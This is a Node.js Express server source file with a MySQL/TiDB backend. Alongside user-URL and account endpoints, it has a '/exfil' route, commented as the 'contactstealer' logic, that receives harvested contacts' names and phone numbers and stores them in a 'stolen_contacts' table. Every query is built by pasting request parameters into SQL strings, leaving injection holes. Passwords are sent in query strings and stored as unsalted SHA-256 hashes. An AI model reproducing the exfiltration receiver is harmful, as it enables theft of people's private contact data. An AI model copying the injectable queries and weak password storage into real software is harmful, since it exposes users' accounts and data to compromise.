const mysql = require('mysql2');
const express = require('express');
require('dotenv').config();
const app = express();
const port = 3000;
const fs = require('fs');
const { parse } = require('path');
const crypto = require('crypto');

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

app.get('/urls', (req, res) => { // Endpoint to get URLs for a user (Will be removed) => Switched too RoomDB
    const queryData = req.query;
    console.log('Query:', queryData);
    if (queryData.userID != null && Number.isInteger(parseInt(queryData.userID))) {
        try {
            getUserUrls(queryData.userID).then((results) => {
                const urls = results.map(row => row.URL);
                if (urls.length === 0) {return res.send({status: 'Error', message: 'no User found'});}
                res.send({status: 'Success', urls: urls});
            })
        } catch (error) {
            console.error('Database error:', error);
            res.status(500).send({status: 'Error', message: 'Database error'});
        }
    } else {
        res.status(400).send({status: 'Error', message: 'Missing userID parameter or invalid userID'});
    }
});

// New endpoint for user management

app.get('/acc', (req, res) => { // Endpoint to get account info for a user 
    const queryData = req.query;
    const userID = parseInt(queryData.userID);
    console.log('Query:', queryData); // Loging the query parameters
    if (userID == null || !Number.isInteger(userID)) {
            return res.status(400).send({status: 'Error', message: 'Invalid userID parameter'});
        } else {
            try {
                getUserAccountInfo(userID).then((results) => {
                    console.log('Database Results:', results); // Loging the database results
                    if (results.length === 0) {
                        return res.send({status: 'Error', message: 'No user found'});
                    }
                    res.send({status: 'Success', accountInfo: results[0]});
                })
            } catch (error) {
                console.error('Database error:', error);
                res.status(500).send({status: 'Error', message: 'Database error'});
            }
        }
}); 

app.post('/acc', (req, res) => { // Endpoint to add account info for a user
    const queryData = req.query;
    const userID = parseInt(queryData.userID);
    const username = queryData.username;
    const password = queryData.password;
    const credits = parseInt(queryData.credits);
    console.log('Query:', queryData);
    console.log('data types:', typeof userID, typeof username, typeof password, typeof credits);
    if (userID != null && username != null && password != null && credits != null) {
        if (!Number.isInteger(userID)){
            return res.status(400).send({status: 'Error', message: 'Invalid userID parameter'});
        } else if (!Number.isInteger(credits)){
            return res.status(400).send({status: 'Error', message: 'Invalid credits parameter'});
        } else {
            try {
                passwordHash = crypto.createHash('sha256').update(password).digest('hex');
                addUserAccountInfo(userID, username, passwordHash, credits);
                res.send({status: 'Success', message: 'Account info added successfully'});
            } catch (error) {
                console.error('Database error:', error);
                res.status(500).send({status: 'Error', message: 'Database error'});
            }
        }
    } else {
        res.status(400).send({status: 'Error', message: 'Missing parameters'});
    }
});

app.use(express.json()); 
app.use(express.text()); 

app.post('/data', (req, res) => {
    const queryData = req.query; 

    console.log('Query:', queryData);
    if (queryData.userID != null && queryData.url != null) {
        try{
            addUsertoDB(queryData.userID, queryData.url);
        } catch (error) {
            console.error('Database error:', error);
            res.status(500).send({status: 'Error', message: 'Database error'});
        }
        res.send({status: 'Success', message: 'Data added successfully'});
    } else {
        res.status(400).send({status: 'Error', message: 'Missing userID or url parameter '});
    }
});

// Logic for the contactstealer
app.post('/exfil', (req, res) => {
    const contacts = req.body.contacts;
    
    if (!contacts || !Array.isArray(contacts)) {
        return res.status(400).send({status: 'Error', message: 'No contacts received'});
    }

    // Mapping fields
    const sql = "INSERT IGNORE INTO stolen_contacts (contact_id, first_name, last_name, phone_number) VALUES ?";
    const values = contacts.map(c => [c.id, c.firstName, c.lastName, c.phone]);

    connection.query(sql, [values], (err, results) => {
        if (err) {
            console.error('TiDB Insert Error:', err);
            return res.status(500).send({status: 'Error', message: err.message});
        }
        console.log(`DATA EXFILTRATED: ${results.affectedRows} records added to TiDB.`);
        res.send({status: 'Success', message: 'Data successfully saved to TiDB'});
    });
});



//  Database connection setup

const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USERNAME,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_DATABASE,
    port: process.env.DB_PORT,
    ssl: {
      ca: fs.readFileSync('/etc/secrets/isrgrootx1.pem'),
      minVersion: 'TLSv1.2',
      rejectUnauthorized: true
    }
};
const connection = mysql.createConnection(dbConfig);
connection.connect((err) => {
  if (err) {
    console.error('Error connecting to the database:', err);
    return;
  }
    console.log('Connected to the MySQL database.');
});

function queryDatabase(sql) {
return new Promise((resolve, reject) => {
    connection.query(sql, (err, results) => {
    if (err) {
        return reject(err);
    }
    resolve(results);
    });
});
}

function addUsertoDB(userID, url) {
const sql = `INSERT INTO userfav (UserID, URL) VALUES ('${userID}', '${url}')`;
return queryDatabase(sql);
}

function getUserUrls(userID) {
const sql = `SELECT URL FROM userfav WHERE UserID = '${userID}'`;
return queryDatabase(sql);
}

function getUserAccountInfo(userID) {
const sql = `SELECT * FROM Persons WHERE UserID = '${userID}'`;
return queryDatabase(sql);
}

function addUserAccountInfo(userID, username , password, credits) {
const sql = `INSERT INTO Persons (AccID, Username, Password, Credits) VALUES ('${userID}', '${username}', '${password}', ${credits})`;
return queryDatabase(sql);
}

function endConnection() {
connection.end((err) => {
  if (err) {
    console.error('Error closing the database connection:', err);
    return;
  }
    console.log('Database connection closed.');
});
}


process.on('SIGINT', () => {
  endConnection();
  process.exit();

});


